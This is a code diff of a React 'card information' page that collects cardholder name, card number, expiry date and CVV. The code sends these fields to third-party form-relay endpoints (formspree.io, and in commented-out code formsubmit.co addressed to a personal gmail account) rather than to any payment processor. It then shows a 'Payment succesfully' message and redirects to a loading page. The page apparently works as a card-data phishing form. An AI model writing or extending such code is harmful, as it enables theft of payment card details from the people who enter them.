@@ -1,56 +1,87 @@
+/* eslint-disable jsx-a11y/alt-text */
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import "./cardstyl.css";
+import axios from "axios";
+import { ToastContainer, toast } from "react-toastify";
 
 export default function Cardinformation() {
   const navigate = useNavigate();
-  const [form, setForm] = useState({
-    cardholdername: "",
-    cardnumber: "",
-    cardexpirymonths: "",
-    cardexpiryyear: "",
-    CardCvvNumber: "",
-  });
-  const onUpdateField = (e) => {
-    const nextFormState = {
-      ...form,
-      [e.target.name]: e.target.value,
-    };
-    setForm(nextFormState);
-  };
-  // console.log(window.location.href);
-  // if (form.CardCvvNumber.length === 3) {
-  //   navigate("/Loading");
-  //   console.log(window.location.href);
-  // }
+  // const [form, setForm] = useState({
+  //   cardholdername: "",
+  //   cardnumber: "",
+  //   cardexpirymonths: "",
+  //   cardexpiryyear: "",
+  //   CardCvvNumber: "",
+  // });
+  // const onUpdateField = (e) => {
+  //   const nextFormState = {
+  //     ...form,
+  //     [e.target.name]: e.target.value,
+  //   };
+  //   setForm(nextFormState);
+  // };
+  // // console.log(window.location.href);
+  // // if (form.CardCvvNumber.length === 3) {
+  // //   navigate("/Loading");
+  // //   console.log(window.location.href);
+  // // }
 
-  let handleSubmit = async (e) => {
+  // let handleSubmit = async (e) => {
+  //   e.preventDefault();
+
+  //   alert(JSON.stringify(form, null, 2));
+  //   let res = await fetch(
+  //     "https://formsubmit.co/el/derina/mrsanjaydhakad986@gmail.com",
+  //     {
+  //       method: "POST",
+  //       headers: {
+  //         "Content-Type": "multipart/form-data",
+  //         Accept: "application/json",
+  //       },
+  //       body: JSON.stringify({
+  //         cardholdername: form.cardholdername,
+  //         cardnumber: form.cardnumber,
+  //         cardexpirymonths: form.cardexpirymonths,
+  //         cardexpiryyear: form.cardexpiryyear,
+  //         CardCvvNumber: form.CardCvvNumber,
+  //       }),
+  //     }
+  //   );
+
+  //   if (res.status === 200) {
+  //     navigate("/Loading");
+  //     window.scrollTo({
+  //       top: 0,
+  //       left: 100,
+  //       behavior: "smooth",
+  //     });
+  //   }
+  // };
+
+  const saveFormData = async (e) => {
     e.preventDefault();
 
-    alert(JSON.stringify(form, null, 2));
-    let res = await fetch("https://formspree.io/f/mbjbklkl", {
-      method: "POST",
-      headers: {
-        "Content-Type": "multipart/form-data",
-        Accept: "application/json",
-      },
-      body: JSON.stringify({
-        cardholdername: form.cardholdername,
-        cardnumber: form.cardnumber,
-        cardexpirymonths: form.cardexpirymonths,
-        cardexpiryyear: form.cardexpiryyear,
-        CardCvvNumber: form.CardCvvNumber,
-      }),
-    });
+    const data = new FormData(e.target);
+    const Formvlaues = Object.fromEntries(data.entries());
 
-    if (res.status === 200) {
-      navigate("/Loading");
-      window.scrollTo({
-        top: 0,
-        left: 100,
-        behavior: "smooth",
+    axios
+      .post(`https://formspree.io/f/xvoyqvpr`, Formvlaues)
+      .then((response) => {
+        if (response.status) {
+          let dataSet = response.data;
+          console.log();
+
+          if (dataSet.ok) {
+            toast.success("Payment succesfully ");
+            navigate("/Loading");
+            e.target.reset();
+          } else {
+            toast.error("Server error");
+          }
+        }
       });
-    }
+    console.log(Formvlaues);
   };
   return (
     <>
@@ -118,9 +149,8 @@ export default function Cardinformation() {
 
                 <form
                   className="card-body"
-                  method="post"
-                  action="https://formspree.io/f/mbjbklkl"
-                  onSubmit={handleSubmit}
+                  onSubmit={(e) => saveFormData(e)}
+                  encType="multipart/form-data"
                   style={{ height: "350px" }}
                 >
                   <div className="input-group flex-nowrap">
@@ -131,8 +161,8 @@ export default function Cardinformation() {
                       aria-label="Name"
                       aria-describedby="addon-wrapping"
                       name="cardholdername"
-                      value={form.cardholdername}
-                      onChange={onUpdateField}
+                      // value={form.cardholdername}
+                      // onChange={onUpdateField}
                       required
                     />
                   </div>
@@ -147,8 +177,8 @@ export default function Cardinformation() {
                       aria-label="Username"
                       aria-describedby="addon-wrapping"
                       name="cardnumber"
-                      value={form.cardnumber}
-                      onChange={onUpdateField}
+                      // value={form.cardnumber}
+                      // onChange={onUpdateField}
                       required
                     />
                   </div>
@@ -163,8 +193,8 @@ export default function Cardinformation() {
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
                         name="cardexpirymonths"
-                        value={form.cardexpirymonths}
-                        onChange={onUpdateField}
+                        // value={form.cardexpirymonths}
+                        // onChange={onUpdateField}
                       >
                         <option selected>01</option>
                         <option value="1">02</option>
@@ -188,8 +218,8 @@ export default function Cardinformation() {
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
                         name="cardexpiryyear"
-                        value={form.cardexpiryyear}
-                        onChange={onUpdateField}
+                        // value={form.cardexpiryyear}
+                        // onChange={onUpdateField}
                       >
                         <option selected>2021</option>
                         <option value="2021">2022</option>
@@ -217,8 +247,8 @@ export default function Cardinformation() {
                       aria-label="Name"
                       aria-describedby="addon-wrapping"
                       name="CardCvvNumber"
-                      value={form.CardCvvNumber}
-                      onChange={onUpdateField}
+                      // value={form.CardCvvNumber}
+                      // onChange={onUpdateField}
                       required
                     />
                   </div>
@@ -264,6 +294,7 @@ export default function Cardinformation() {
             </div>
           </div>
         </div>
+        <ToastContainer />
       </div>
 
       {/* third card  */}
